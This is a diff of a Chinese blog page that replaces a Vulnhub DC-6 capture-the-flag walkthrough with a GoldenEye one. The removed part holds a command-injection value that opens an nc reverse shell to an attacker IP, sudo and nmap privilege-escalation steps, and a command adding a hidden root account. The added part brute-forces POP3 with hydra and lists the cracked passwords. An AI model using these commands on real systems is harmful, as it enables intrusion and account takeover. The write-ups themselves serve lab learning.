@@ -17,7 +17,7 @@
     <meta name="keywords" content="G00dddd">
 
 
-<title>DC-6 | G00d`s Blog</title>
+<title>Vulnhub-1goldeneye | G00d`s Blog</title>
 
 
 
@@ -321,76 +321,11 @@
                 <div class="container">
     
     
-        <div class="post-toc">
-    <div class="tocbot-list">
-    </div>
-    <div class="tocbot-list-menu">
-        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
-        <a onclick="go_top()">Back to top</a>
-        <a onclick="go_bottom()">Go to bottom</a>
-    </div>
-</div>
-
-<script>
-    var tocbot_timer;
-    var DEPTH_MAX = 6; // 为 6 时展开所有
-    var tocbot_default_config = {
-        tocSelector: '.tocbot-list',
-        contentSelector: '.post-content',
-        headingSelector: 'h1, h2, h3, h4, h5',
-        orderedList: false,
-        scrollSmooth: true,
-        onClick: extend_click,
-    };
-
-    function extend_click() {
-        clearTimeout(tocbot_timer);
-        tocbot_timer = setTimeout(function() {
-            tocbot.refresh(obj_merge(tocbot_default_config, {
-                hasInnerContainers: true
-            }));
-        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
-    }
-
-    document.ready(function() {
-        tocbot.init(obj_merge(tocbot_default_config, {
-            collapseDepth: 1
-        }));
-    });
-
-    function expand_toc() {
-        var b = document.querySelector('.tocbot-toc-expand');
-        var expanded = b.getAttribute('data-expanded');
-        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
-        tocbot.refresh(obj_merge(tocbot_default_config, {
-            collapseDepth: expanded ? 1 : DEPTH_MAX
-        }));
-        b.innerText = expanded ? 'Expand all' : 'Collapse all';
-    }
-
-    function go_top() {
-        window.scrollTo(0, 0);
-    }
-
-    function go_bottom() {
-        window.scrollTo(0, document.body.scrollHeight);
-    }
-
-    function obj_merge(target, source) {
-        for (var item in source) {
-            if (source.hasOwnProperty(item)) {
-                target[item] = source[item];
-            }
-        }
-        return target;
-    }
-</script>
-    
 
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">DC-6</h1>
+            <h1 class="post-title">Vulnhub-1goldeneye</h1>
             
                 <div class="post-meta">
                     
@@ -399,7 +334,7 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">十一月 22, 2024&nbsp;&nbsp;17:06:26</a>
+                        Date: <a href="#">十一月 22, 2024&nbsp;&nbsp;16:52:10</a>
                         </span>
                     
                     
@@ -415,49 +350,48 @@
         </header>
 
         <div class="post-content">
-            <h1 id="DC-6"><a href="#DC-6" class="headerlink" title="DC-6"></a>DC-6</h1><p>第一步信息收集</p>
-<p><img src="/dc-6//1.png" alt="1"></p>
-<p>192.168.213.158</p>
-<p><img src="/dc-6//2.png" alt="2"></p>
-<p>Vi &#x2F;etc&#x2F;hosts 把重定向加上就行了</p>
-<p>接着扫目录发现跟之前打过的靶机有点像</p>
-<p><img src="/dc-6//3.png" alt="3"></p>
-<p><img src="/dc-6//4.png" alt="4"></p>
-<p>用wpscan(专门搜索wordpross漏洞)再看看</p>
-<p>Wpscan –url <a target="_blank" rel="noopener" href="http://wordy/">http://wordy</a></p>
-<p><img src="/dc-6//5.png" alt="5"></p>
-<p>用wpscan枚举一下用户名</p>
-<p>Wpscan –url <a target="_blank" rel="noopener" href="http://wordy/">http://wordy</a> –enumerate u</p>
-<p><img src="/dc-6//6.png" alt="6"></p>
-<p>爆出几个账号,cat &gt; 1.txt 保存一下,然后wpscan –url <a target="_blank" rel="noopener" href="http://wordy/">http://wordy</a> -U 1.txt -P rockyou.txt</p>
-<p><img src="/dc-6//7.png" alt="7"></p>
-<p>Url&#x2F;wp-login.php 登录后台发现activity monitor</p>
-<p>用searchsploit activity monitor</p>
-<p><img src="/dc-6//8.png" alt="8"></p>
-<p><img src="/dc-6//../../../../%E5%88%B7%E9%A2%98/%E6%9C%AC%E5%9C%B0/vulnhub/media/image9.png"><img src="/dc-6//9.png" alt="9">这里有命令执行,127.0.0.1|nc -e &#x2F;bin&#x2F;bash 192.168.213.137 9999</p>
-<p><img src="/dc-6//10.png" alt="10"></p>
-<p>拿到普通权限</p>
-<p>Python -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
-<p>在主机内部找信息</p>
-<p><img src="/dc-6//11.png" alt="11"></p>
-<p>Ssh <a href="mailto:&#103;&#x72;&#97;&#104;&#x61;&#109;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#50;&#x31;&#x33;&#x2e;&#x31;&#x35;&#56;">&#103;&#x72;&#97;&#104;&#x61;&#109;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#50;&#x31;&#x33;&#x2e;&#x31;&#x35;&#56;</a></p>
-<p>提权</p>
-<p><img src="/dc-6//12.png" alt="12"></p>
-<p>我们发现当前账号对backups.sh读写操作</p>
-<p>把shell写入backups</p>
-<p>Echo “&#x2F;bin&#x2F;bash” &gt;&gt; backups.sh</p>
-<p>Sudo -u jens .&#x2F;backups.sh &#x2F;&#x2F;这里用jens执行backups</p>
-<p><img src="/dc-6//13.png" alt="13"></p>
-<p>发现切换账号成功</p>
-<p>Sudo -l发现jens可以用root执行nmap,那就用nmap提权</p>
-<p><img src="/dc-6//14.png" alt="14"></p>
-<p>需要先看nmap的版本号 nmap -v</p>
-<p>然后把shell写入”shell”里,用nmap执行</p>
-<p>echo ‘os.execute(“&#x2F;bin&#x2F;sh”)’ &gt; shell</p>
-<p>sudo nmap –script&#x3D;shell</p>
-<p><img src="/dc-6//15.png" alt="15"></p>
-<p>添加root账号</p>
-<p>useradd -u 0 -o -g 0 -G root -s &#x2F;bin&#x2F;bash -d &#x2F;home&#x2F;root1-m root1</p>
+            <p>首先用nmap -sP 192.168.124.0&#x2F;24查找一下靶机的IP地址</p>
+<p><code>C:\Users\Anonymous\Desktop&gt;nmap -sP 192.168.124.0/24</code></p>
+<p><code>Starting Nmap 7.94 ( https://nmap.org ) at 2024-09-09 12:39 中国标准时间</code></p>
+<p><code>Nmap scan report for 192.168.124.1 --物理机地址</code></p>
+<p><code>Host is up (0.0010s latency).</code></p>
+<p><code>MAC Address: 00:50:56:C0:00:08 (VMware)</code></p>
+<p><code>Nmap scan report for 192.168.124.2 --网关地址</code></p>
+<p><code>Host is up (0.0011s latency).</code></p>
+<p><code>MAC Address: 00:50:56:FC:73:90 (VMware)</code></p>
+<p><code>Nmap scan report for 192.168.124.128</code></p>
+<p><code>Host is up (0.0020s latency).</code></p>
+<p><code>MAC Address: 00:0C:29:A5:9C:0C (VMware)</code></p>
+<p><code>Nmap scan report for 192.168.124.254</code></p>
+<p><code>Host is up (0.00033s latency).</code></p>
+<p><code>MAC Address: 00:50:56:F1:12:AA (VMware)</code></p>
+<p><code>Nmap scan report for 192.168.124.129 --攻击机地址</code></p>
+<p><code>Host is up.</code></p>
+<p><code>Nmap done: 256 IP addresses (5 hosts up) scanned in 2.07 seconds --有5个地址存活</code></p>
+<p>192.168.124.128    192.168.124.254这两个地址暂时不知道</p>
+<p>直接访问192.168.124.128</p>
+<p>然后打开F12，发现把前端代码泄露出来了</p>
+<img src="/vulnhub-1goldeneye//1.png" alt="1" style="zoom:200%;">
+
+<p>这个js文件就是切入点，查看代码发现2个用户名，一个html编码的密码，用html解密一下</p>
+<p><img src="/vulnhub-1goldeneye//2.png" alt="2"></p>
+<p><img src="/vulnhub-1goldeneye//3.png" alt="3"></p>
+<p>用boris登录成功，发现前端依然有注释掉的信息，前面也告诉说一直开的有pop3服务</p>
+<p><img src="/vulnhub-1goldeneye//4.png" alt="4"></p>
+<p>用nmap -p -A 192.168.124.128扫描运行的服务<img src="/vulnhub-1goldeneye//5.png" alt="5"></p>
+<p>这时候用hydra爆破登录密码，刚好能够结合上面给的两个账号，但是根据之前的成功登录，账号肯定是全小写 用cat把账号写进去</p>
+<p>hydra 192.168.124.128 -s 55007 pop3 -L user.txt -P &#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;wapitiCore&#x2F;data&#x2F;attacks&#x2F;passwords.txt</p>
+<p>用户：boris 密码：secret1!</p>
+<p>用户：natalya 密码：bird</p>
+<p>用nc连接pop3服务</p>
+<p>nc 192.168.124.128 55007</p>
+<p>用nc连接时会提示连接到服务，但是不是提示要输入账号密码</p>
+<p><img src="/vulnhub-1goldeneye//6.png" alt="6"></p>
+<p>然后 User boris pass secret1!</p>
+<p>List查看邮件</p>
+<p>Retr 1查看第一个邮件</p>
+<p>Dele 1删除第一条邮件</p>
+<p>Quit退出连接</p>
 
         </div>
 
@@ -494,10 +428,10 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="../dc-7/">DC-7</a>
+                <a class="prev" rel="prev" href="../vulnhub-3raven/">Vulnhub-3raven</a>
             
             
-            <a class="next" rel="next" href="../dc-5/">DC-5</a>
+            <a class="next" rel="next" href="../vulnhub-2lampiao/">Vulnhub-2lampiao</a>
             
         </section>
 
